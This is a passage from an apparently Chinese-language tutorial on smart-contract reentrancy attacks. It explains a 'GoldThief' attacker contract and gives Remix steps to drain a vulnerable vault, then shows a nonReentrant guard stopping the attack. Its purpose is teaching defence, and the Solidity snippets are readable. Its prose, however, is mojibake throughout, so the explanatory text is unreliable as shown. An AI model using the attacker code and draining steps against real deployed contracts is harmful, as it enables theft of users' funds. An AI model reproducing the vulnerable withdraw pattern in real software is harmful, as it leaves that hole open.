    targetVault.vulnerableWithdraw();
}

```

å¦‚æœå¤„äº **â€œæ˜“å—æ”»å‡»æ¨¡å¼â€**ï¼š

- æˆ‘ä»¬æ£€æŸ¥é‡‘åº“æ˜¯å¦è¿˜æœ‰ ETH å¯å·
- æˆ‘ä»¬æ£€æŸ¥æ˜¯å¦æœªè¾¾åˆ°æ”»å‡»æ¬¡æ•°ä¸Šé™
- å¦‚æœä¸¤ä¸ªæ¡ä»¶éƒ½æ»¡è¶³â€”â€”**å†æ¬¡å‘èµ·æ”»å‡»**

è¿™å°±æ˜¯**é‡å…¥å¾ªç¯**çš„å®é™…è¿ä½œï¼š

- é‡‘åº“æŠŠ ETH å‘ç»™æˆ‘ä»¬ â†’ è§¦å‘ `receive()`
- `receive()` å†æ¬¡è°ƒç”¨ `vulnerableWithdraw()`
- é‡‘åº“å†å‘æ›´å¤š ETH â†’ å†è§¦å‘ `receive()`
- å¦‚æ­¤å¾ªç¯â€¦â€¦

æ¯æ¬¡ï¼Œé‡‘åº“ä»ç„¶**è®¤ä¸ºæˆ‘ä»¬å°šæœªæç°**â€”â€”å› ä¸ºå®ƒè¿˜æ²¡æ¥å¾—åŠæ›´æ–°ä½™é¢ã€‚

---

### 3. ğŸ”’ å¦‚æœæˆ‘ä»¬åœ¨æµ‹è¯•å®‰å…¨é‡‘åº“â€¦â€¦

```solidity

if (attackingSafe) {
    targetVault.safeWithdraw(); // This will fail
}

```

åœ¨â€œå®‰å…¨æ¨¡å¼â€ä¸‹ï¼Œæˆ‘ä»¬è¯•å›¾é‡å…¥ `safeWithdraw()`â€”â€”ä½†å®ƒä¼šå¤±è´¥ã€‚

ä¸ºä»€ä¹ˆï¼Ÿ

å› ä¸ºï¼š

- `nonReentrant` ä¿®é¥°ç¬¦åœ¨èµ·ä½œç”¨
- æˆ‘ä»¬è¯•å›¾é‡å…¥æ—¶ï¼Œä¿®é¥°ç¬¦ä¼šæ£€æµ‹åˆ°å‡½æ•°æ­£åœ¨è¿è¡Œ
- å¹¶ç«‹åˆ»é˜»æ­¢é‡å…¥

æ”»å‡»åœ¨æ­¤å¤„**ç›´æ¥å¤­æŠ˜**ï¼Œä¸ä¼šå†æœ‰èµ„é‡‘è¢«å‘é€ã€‚

## ğŸš« `attackSafe()` â€”â€” æƒ³åˆ©ç”¨è¢«åŠ å›ºé‡‘åº“çš„å¤±è´¥å°è¯•

```solidity

function attackSafe() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH");

    attackingSafe = true;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();

    // This will fail due to the reentrancy guard
    targetVault.safeWithdraw();
}

```

è¿™ä¸ªå‡½æ•°æ¨¡æ‹Ÿç›¸åŒçš„æ”»å‡»ç­–ç•¥â€”â€”ä½†è¿™æ¬¡ç›®æ ‡æ˜¯é‡‘åº“çš„**å®‰å…¨ç‰ˆæœ¬**ï¼š`safeWithdraw()`ã€‚

ä¸ `vulnerableWithdraw()` ä¸åŒï¼Œè¿™ä¸ªå‡½æ•°**å—åˆ°äº†è‰¯å¥½ä¿æŠ¤**ã€‚

æˆ‘ä»¬æ¥çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆï¼š

---

### ğŸ›¡ï¸ è®¾ç½®å®‰å…¨æ”»å‡»å°è¯•

- ä¸ `attackVulnerable()` ä¸€æ ·ï¼Œæˆ‘ä»¬ï¼š
    - æ£€æŸ¥è°ƒç”¨è€…æ˜¯å¦ä¸ºæ”»å‡»è€…ï¼ˆ`owner`ï¼‰
    - è¦æ±‚è‡³å°‘ 1 ETH æ¥æ¨¡æ‹ŸçœŸå®å­˜æ¬¾
    - å°† `attackingSafe` æ ‡è®°ä¸º `true`ï¼Œä»¥ä¾¿å›é€€å‡½æ•°çŸ¥é“æˆ‘ä»¬åœ¨æµ‹è¯•å®‰å…¨è·¯å¾„
    - é‡ç½®æ”»å‡»è®¡æ•°å™¨

---

### ğŸ’° å‘é‡‘åº“å­˜å…¥ ETH

```solidity

targetVault.deposit{value: msg.value}();

```

æˆ‘ä»¬å‘é‡‘åº“å­˜å…¥ ETH ä»¥è·å–ä½™é¢â€”â€”ä¸ä¹‹å‰ç›¸åŒã€‚æ­¤æ—¶ï¼Œé‡‘åº“ä»¥ä¸ºæˆ‘ä»¬æ˜¯åˆæ³•ç”¨æˆ·ã€‚

---

### ğŸšª å°è¯•æç°å¹¶é‡å…¥

```solidity

targetVault.safeWithdraw();

```

è¿™é‡Œå·®åˆ«å°±æ˜¾ç°å‡ºæ¥äº†ã€‚

å½“è°ƒç”¨ `safeWithdraw()` æ—¶ï¼š

1. é‡‘åº“æ£€æŸ¥æˆ‘ä»¬çš„ä½™é¢
2. å®ƒå°†æˆ‘ä»¬çš„ä½™é¢è®¾ä¸º **0**
3. å®ƒå°è¯•æŠŠ ETH å‘å›ç»™æˆ‘ä»¬
4. `GoldThief` åˆçº¦çš„ `receive()` å‡½æ•°è¢«è§¦å‘

ç„¶åæˆ‘ä»¬åœ¨ `receive()` ä¸­è¯•å›¾å†æ¬¡è°ƒç”¨ `safeWithdraw()` é‡å…¥â€¦â€¦

---

### ğŸ”’ ä½†è¿™æ¬¡æˆ‘ä»¬ç¢°åˆ°äº†å¢™çš„é˜»æŒ¡

å½“æˆ‘ä»¬è¯•å›¾é‡å…¥ `safeWithdraw()` æ—¶ï¼Œ`nonReentrant` ä¿®é¥°ç¬¦æ£€æŸ¥ `_status` æ ‡è®°ï¼Œå‘ç°è¯¥å‡½æ•°å·²ç»åœ¨æ‰§è¡Œä¸­ã€‚

å®ƒç«‹åˆ»æŠ›å‡ºé”™è¯¯ï¼š

```
Reentrant call blocked

```

å°±è¿™æ ·â€”â€”**æ”»å‡»åœ¨å¯åŠ¨å‰å¤±è´¥**ã€‚

æ²¡æœ‰ç¬¬äºŒæ¬¡è¿›å…¥ã€‚

æ²¡æœ‰å¾ªç¯ã€‚

æ²¡æœ‰ç›—çªƒã€‚

åªæ˜¯ä¸€ä¸ªå¹²è„†åˆ©è½çš„åœæ­¢ã€‚

---

### ğŸ§  è¿™ä¸ºä»€ä¹ˆé‡è¦

è¿™ä¸ªå‡½æ•°æ˜¯**å®‰å…¨æ€§çš„è¯æ˜**â€”â€”å®ƒè¡¨æ˜é€šè¿‡å‡ è¡Œé¢å¤–çš„ä¿æŠ¤ï¼ˆä¾‹å¦‚é‡å…¥å®ˆæŠ¤å’Œæ­£ç¡®çš„æ“ä½œé¡ºåºï¼‰ï¼Œæˆ‘ä»¬å°±èƒ½å°†ä¸¥é‡æ¼æ´æ‰¼æ€åœ¨èŒèŠ½ä¸­ã€‚

ä»…ä¼šå†™æ™ºèƒ½åˆçº¦è¿˜ä¸å¤Ÿâ€”â€”ä½ è¿˜å¿…é¡»çŸ¥é“å¦‚ä½•**ä¿æŠ¤å®ƒä»¬**ã€‚

---

### ğŸƒâ€â™‚ï¸ `stealLoot()`

```solidity

function stealLoot() external {
    require(msg.sender == owner, "Only owner");
    payable(owner).transfer(address(this).balance);
}

```

æ”»å‡»ç»“æŸåï¼Œè¿™ä¸ªå‡½æ•°å…è®¸æ”»å‡»è€…æŠŠ**è¢«ç›—æ¥çš„çš„å…¨éƒ¨ ETH** ä»`GoldThief` åˆçº¦**æç°**åˆ°Taä»¬çš„ç§äººé’±åŒ…ã€‚åªæœ‰åˆçº¦æ‰€æœ‰è€…å¯ä»¥è°ƒç”¨å®ƒã€‚

---

### ğŸ§¾ `getBalance()`

```solidity

function getBalance() external view returns (uint256) {
    return address(this).balance;
}

```

ä¸€ä¸ªç®€å•çš„åªè¯»å‡½æ•°ï¼Œè¿”å› `GoldThief` åˆçº¦å½“å‰æŒæœ‰çš„ ETH ä½™é¢ã€‚ç”¨æ¥æŸ¥çœ‹ä»é‡‘åº“ä¸­æŠ½èµ°äº†å¤šå°‘èµ„é‡‘ã€‚

---

### ğŸ›‘ è¿™ä¸ºä»€ä¹ˆé‡è¦

è¿™ä¸ªåˆçº¦å‘ä½ ç²¾ç¡®æ¼”ç¤ºäº†é‡å…¥æ”»å‡»çš„å·¥ä½œåŸç†ã€‚

- æ”»å‡»è€…åœ¨**å‡½æ•°æ‰§è¡Œä¸­æ®µ**å–å¾—æ§åˆ¶æƒ
- åœ¨ä½™é¢æ›´æ–°ä¹‹å‰
- å¹¶å¤šæ¬¡æŠ½å–ç›¸åŒçš„ ETH

## ğŸ§ª å¦‚ä½•åœ¨ Remix ä¸­æ¨¡æ‹Ÿé‡å…¥æ”»å‡»

æˆ‘ä»¬æŠŠé»‘å®¢å¸½æˆ´ä¸Šï¼ˆå‡ºäºå¥½ç›®çš„ï¼‰ï¼Œä¸€æ­¥æ­¥èµ°è¿‡æ˜“å—æ”»å‡»ä¸å®‰å…¨ä¸¤ç§æƒ…å½¢ã€‚

---

### ğŸ”¨ ç¬¬ä¸€æ­¥ï¼šåœ¨ Remix ä¸­è®¾ç½®æ–‡ä»¶

åœ¨ Remixä¸­ï¼š

- åœ¨æ–‡ä»¶æµè§ˆå™¨ä¸­**åˆ›å»ºä¸¤ä¸ªæ–°æ–‡ä»¶**ï¼š
    - `GoldVault.sol` â€“ ç²˜è´´å®Œæ•´çš„é‡‘åº“åˆçº¦ä»£ç 
    - `GoldThief.sol` â€“ ç²˜è´´æ”»å‡»è€…åˆçº¦å’Œæ¥å£ä»£ç 

---

### âš™ï¸ ç¬¬äºŒæ­¥ï¼šç¼–è¯‘ä¸¤ä¸ªåˆçº¦

- ç‚¹å‡» **Solidity Compiler** é€‰é¡¹å¡ï¼ˆå·¦è¾¹æ ï¼‰ã€‚
- ç¡®ä¿ä½¿ç”¨ **ç¼–è¯‘å™¨ç‰ˆæœ¬ 0.8.19** æˆ–å…¼å®¹ç‰ˆæœ¬ã€‚
- ç‚¹å‡» **Compile GoldVault.sol**
- ç„¶åç‚¹å‡» **Compile GoldThief.sol**

ä½ åº”è¯¥çœ‹åˆ° âœ… â€œCompilation successfulâ€ã€‚

---

### ğŸš€ ç¬¬ä¸‰æ­¥ï¼šéƒ¨ç½²é‡‘åº“ï¼ˆè¯ºå…‹æ–¯å ¡ï¼‰

1. å»åˆ° **Deploy & Run Transactions** é€‰é¡¹å¡ã€‚
2. åœ¨åˆçº¦ä¸‹æ‹‰æ¡†ä¸­é€‰æ‹© `GoldVault`ã€‚
3. ç‚¹å‡» **Deploy**ã€‚
4. Remix ä¼šéƒ¨ç½²åˆçº¦å¹¶åœ¨å·¦ä¾§é¢æ¿æ˜¾ç¤ºå®ƒã€‚
5. å¤åˆ¶ **é‡‘åº“åˆçº¦åœ°å€**â€”â€”ä½ éœ€è¦æŠŠå®ƒä¼ ç»™å°å·åˆçº¦ã€‚

æˆ‘ä»¬ç§°å®ƒä¸ºï¼š

`vaultAddress = 0x...`

---

### ğŸ¦¹ ç¬¬å››æ­¥ï¼šéƒ¨ç½²å°å·åˆçº¦

1. æŠŠåˆçº¦ä¸‹æ‹‰æ¡†åˆ‡æ¢åˆ° `GoldThief`ã€‚
2. åœ¨æ„é€ å‡½æ•°è¾“å…¥å­—æ®µä¸­ç²˜è´´ `vaultAddress`çš„åœ°å€å€¼ã€‚
    - ç¡®ä¿å®ƒæ”¾åœ¨å¼•å·ä¸­ï¼Œä¾‹å¦‚ `"0x123..."`
3. ç‚¹å‡» **Deploy**ã€‚

ç°åœ¨å°å·åˆçº¦çŸ¥é“è¦æ”»å‡»è°äº†ã€‚

---

### ğŸ’£ ç¬¬äº”æ­¥ï¼šæ”»å‡»æ˜“å—æ”»å‡»çš„æç°æ“ä½œ

1. å±•å¼€å·²éƒ¨ç½²çš„ **GoldThief** åˆçº¦ã€‚
2. æ‰¾åˆ°å‡½æ•° `attackVulnerable()`ã€‚
3. è¾“å…¥ **1 ether** ä½œä¸º valueï¼ˆ`1000000000000000000`ï¼‰ï¼Œç‚¹å‡» **transact**ã€‚

ğŸ¬ è§‚å¯Ÿäº¤æ˜“æ—¥å¿—å‘ç”Ÿçš„äº‹æƒ…ï¼š

- æ”»å‡»è€…ä¼šé€’å½’è°ƒç”¨ `vulnerableWithdraw()` å¤šæ¬¡ã€‚
- é‡‘åº“çš„ä½™é¢ä¼šæ€¥å‰§ä¸‹é™ã€‚
- ä¸€åˆ‡éƒ½æ˜¯å› ä¸ºåˆçº¦åœ¨è½¬è´¦å‰æ²¡æœ‰æ›´æ–°ä½™é¢ã€‚

---

### ğŸ§® ç¬¬å…­æ­¥ï¼šç¡®è®¤èµƒæ¬¾

- åœ¨å°å·åˆçº¦ä¸­ç‚¹å‡» `getBalance()`
- ä½ ä¼šçœ‹åˆ°å¤šä¸ªETHè¢«æŠ½åˆ°å°å·åˆçº¦ä¸­

å°è¯•è°ƒç”¨ `stealLoot()` æŠŠå®ƒè½¬åˆ°æ”»å‡»è€…çš„é’±åŒ…ã€‚

---

### ğŸ§· ç¬¬ä¸ƒæ­¥ï¼šå°è¯•æ”»å‡»å®‰å…¨ç‰ˆæœ¬ï¼ˆå¹¶çœ‹å®ƒå¤±è´¥ï¼‰

1. **é‡æ–°éƒ¨ç½² GoldVault** åˆçº¦ä»¥é‡ç½®çŠ¶æ€
2. é‡æ–°éƒ¨ç½² **GoldThief**å¹¶ä¼ å…¥æ–°çš„é‡‘åº“åœ°å€
3. è¿™æ¬¡ï¼Œä½¿ç”¨ 1 ETHè°ƒç”¨ `attackSafe()` 

ğŸ§± è¿™ä¸ªäº¤æ˜“ä¼š**å¤±è´¥**ã€‚

ä¸ºä»€ä¹ˆï¼Ÿå› ä¸º `safeWithdraw()` ä½¿ç”¨äº†ï¼š

- **`nonReentrant` ä¿®é¥°ç¬¦** é˜²æ­¢é‡å…¥
- å®ƒåœ¨**å‘é€èµ„é‡‘å‰**æ›´æ–°ä½™é¢

ä½ å·²ç»é€šè¿‡æœ€ä½³å®è·µ**é˜»æ­¢äº†ä¸€æ¬¡é‡å…¥æ”»å‡»**ã€‚

## ğŸ”’ é‡‘åº“å·²åŠ å›ºã€‚é»‘å®¢è¢«å‡»è´¥ã€‚

ä¸€ä¸ªçœ‹ä¼¼ç®€å•çš„â€œå­˜å–â€ç³»ç»Ÿï¼Œå˜æˆäº†ä¸€å ‚çœŸå®çš„ Solidity å®‰å…¨è¯¾ã€‚

æˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ª**å¾®å°é”™è¯¯**â€”â€”åœ¨æ›´æ–°ä½™é¢ä¹‹å‰å‘é€ ETHâ€”â€”å¦‚ä½•æ‰“å¼€äº†å¯è‡´å‘½çš„**é‡å…¥æ”»å‡»**å¤§é—¨ã€‚éšåæˆ‘ä»¬è§‚å¯Ÿåˆ°èªæ˜çš„æ”»å‡»è€…å¦‚ä½•**åƒåƒè±†äººä¸€æ ·åœ¨é‡‘åº“ä¸­å¾ªç¯æ é£Ÿ**ï¼Œä¸æ–­æŠ½èµ°èµ„é‡‘ã€‚

ä½†æœ‰äº†æ­£ç¡®çš„é˜²æŠ¤ï¼š

- âœ… ä¸€ä¸ª `nonReentrant` é”
- âœ… åœ¨ä¸å¤–éƒ¨äº¤äº’å‰æ›´æ–°çŠ¶æ€

æˆ‘ä»¬å°±èƒ½å½»åº•**éåˆ¶æ¼æ´**ã€‚

è¿™å°±æ˜¯ç¼–å†™æ™ºèƒ½åˆçº¦çœŸæ­£çš„æ„ä¹‰â€”â€”ä¸ä»…ä»…æ˜¯æ„å»ºç‚«é…·åŠŸèƒ½ï¼Œè€Œæ˜¯ç¡®ä¿å®ƒä»¬åšå¦‚ç£çŸ³ï¼Œä¸è¢«æ»¥ç”¨ã€‚

æ‰€ä»¥ä¸ç®¡ä½ æ˜¯åœ¨æ„å»º DAppã€DeFi åè®®ï¼Œè¿˜æ˜¯ä¸‹ä¸€ä¸ª Web3 è¯ºå…‹æ–¯å ¡â€¦â€¦è®°ä½ï¼š

> ä¿æŠ¤å¥½ä½ çš„é»„é‡‘ã€‚é‡å…¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ã€‚
> 

ä¸‹ä¸€ä»½åˆçº¦ï¼ŒGo!